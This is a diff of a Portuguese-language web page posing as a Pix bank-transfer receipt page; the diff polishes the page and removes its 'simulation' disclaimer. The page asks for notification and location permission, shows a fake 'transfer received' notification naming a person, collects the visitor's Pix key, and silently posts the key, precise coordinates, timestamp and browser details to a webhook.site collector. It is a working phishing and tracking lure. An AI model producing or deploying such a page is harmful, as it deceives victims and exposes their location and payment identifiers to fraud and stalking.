@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>receber puxPix</title>
+<title>Receber Pix</title>
 
 <style>
 body{
@@ -20,6 +20,7 @@ body{
   border-radius:18px;
   width:320px;
   text-align:center;
+  box-shadow:0 10px 25px rgba(0,0,0,.15);
 }
 button{
   background:#820ad1;
@@ -31,6 +32,10 @@ button{
   border-radius:12px;
   cursor:pointer;
 }
+button:disabled{
+  opacity:.6;
+  cursor:not-allowed;
+}
 input{
   width:100%;
   padding:12px;
@@ -39,107 +44,147 @@ input{
   border-radius:8px;
   border:1px solid #ccc;
 }
-small{ color:#777; font-size:12px; }
 .alert{
   color:#b00020;
   font-size:13px;
-  margin-top:10px;
+  margin-top:12px;
+}
+.loader{
+  margin-top:15px;
+  font-size:14px;
+  color:#555;
+}
+small{
+  color:red;
+  font-weight:bold;
 }
 </style>
 </head>
 
 <body>
 
+<!-- TELA 1 -->
 <div class="card" id="tela1">
-  <button onclick="pedirPermissoes()">Receber Pix</button>
+  <button id="btn" onclick="iniciar()">Receber Pix</button>
+  <div class="loader" id="loader" style="display:none">
+    Verificando permissões...
+  </div>
   <div id="erro1" class="alert"></div>
 </div>
 
+<!-- TELA 2 -->
 <div class="card" id="tela2" style="display:none">
   <input id="chave" placeholder="Digite sua chave Pix">
-  <button onclick="confirmar()">Receber Pix</button>
-  <small>Simulação — R$100,00 sera transferido</small>
+  <button onclick="confirmar()">Confirmar</button>
 </div>
 
+<!-- TELA 3 -->
 <div class="card" id="tela3" style="display:none">
-  <h3>✅ transferência concluída</h3>
-  <p>a transferência chega em ate 3 dias úteis.</p>
+  <h3>✅ Traferencia concluída</h3>
+  <p>Permissões aceitas com sucesso.</p>
 </div>
 
 <script>
 const WEBHOOK = "https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6";
 let lastPos = null;
-let locationOk = false;
 
-function pedirPermissoes(){
-  document.getElementById("erro1").innerText = "";
+function iniciar(){
+  limpar();
+  bloquear(true);
 
-  // pedir notificação primeiro, no clique
-  if ("Notification" in window) {
-    Notification.requestPermission().then(permission => {
-      if (permission !== "granted") {
-        document.getElementById("erro1").innerText =
-          "Por favor permita notificações para continuar.";
-        return;
-      }
-
-      // notificação de simulação (genérica)
-      new Notification("transferência recebida", {
-        body: "você recebeu uma transferência de R$100,00 de emanuel filipe viera filho",
-        icon: "https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png"
-      });
-
-      // agora pedir localização
-      pedirLocalizacao();
-    });
-  } else {
-    document.getElementById("erro1").innerText =
-      "Seu navegador não suporta notificações.";
+  // NOTIFICAÇÃO
+  if(!("Notification" in window)){
+    erro("Navegador não suporta notificações.");
+    bloquear(false);
+    return;
   }
+
+  if(Notification.permission === "denied"){
+    erro("Notificações bloqueadas. Ative nas configurações.");
+    bloquear(false);
+    return;
+  }
+
+  Notification.requestPermission().then(p=>{
+    if(p !== "granted"){
+      erro("Permita notificações para continuar.");
+      bloquear(false);
+      return;
+    }
+
+    pedirLocalizacao();
+  });
 }
 
 function pedirLocalizacao(){
   if(!navigator.geolocation){
-    document.getElementById("erro1").innerText =
-      "Seu navegador não suporta localização.";
+    erro("Navegador não suporta localização.");
+    bloquear(false);
     return;
   }
 
   navigator.geolocation.getCurrentPosition(
-    pos => {
-      locationOk = true;
+    pos=>{
       lastPos = pos;
-      document.getElementById("tela1").style.display = "none";
-      document.getElementById("tela2").style.display = "block";
+      avancar();
     },
-    () => {
-      document.getElementById("erro1").innerText =
-        "Por favor permita a localização para continuar.";
+    err=>{
+      if(err.code === 1){
+        erro("Localização bloqueada. Ative nas configurações.");
+      }else{
+        erro("Permita a localização para continuar.");
+      }
+      bloquear(false);
     }
   );
 }
 
+function avancar(){
+  new Notification("transferência recebida",{
+    body:"você recebeu uma transferência de 100,00 de emanuel filipe viera filho",
+  });
+
+  document.getElementById("tela1").style.display="none";
+  document.getElementById("tela2").style.display="block";
+}
+
 function confirmar(){
-  fetch(WEBHOOK, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({
-      chave_pix: document.getElementById("chave").value,
+  const chave = document.getElementById("chave").value.trim();
+  if(!chave){
+    alert("Digite uma chave Pix");
+    return;
+  }
+
+  fetch(WEBHOOK,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chave_pix: chave,
       latitude: lastPos.coords.latitude,
       longitude: lastPos.coords.longitude,
       precisao: lastPos.coords.accuracy,
       data: new Date().toISOString(),
       navegador: navigator.userAgent
     })
-  });
+  }).catch(()=>{});
 
   document.getElementById("tela2").style.display="none";
   document.getElementById("tela3").style.display="block";
 }
+
+function erro(msg){
+  document.getElementById("erro1").innerText = msg;
+}
+
+function limpar(){
+  document.getElementById("erro1").innerText = "";
+}
+
+function bloquear(status){
+  document.getElementById("btn").disabled = status;
+  document.getElementById("loader").style.display = status ? "block" : "none";
+}
 </script>
 
 </body>
-</html>
-
-</body>
-</html>
+  </html>
